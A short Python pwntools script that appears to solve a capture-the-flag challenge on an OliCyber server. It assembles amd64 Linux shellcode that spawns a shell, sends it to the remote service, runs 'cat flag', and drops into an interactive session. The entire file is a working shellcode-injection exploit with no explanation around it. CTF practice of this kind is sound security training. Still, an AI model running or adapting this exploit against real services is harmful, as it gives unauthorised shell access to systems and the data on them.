#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux')

shell = asm(shellcraft.sh())
r = remote("software-20.challs.olicyber.it", 13003)

r.recvuntil(b"...")
r.sendline(b"a")
r.recvuntil(b": ")
r.sendline(str(len(shell)).encode())
r.recv()
r.send(shell)
r.sendline(b"cat flag")
r.interactive()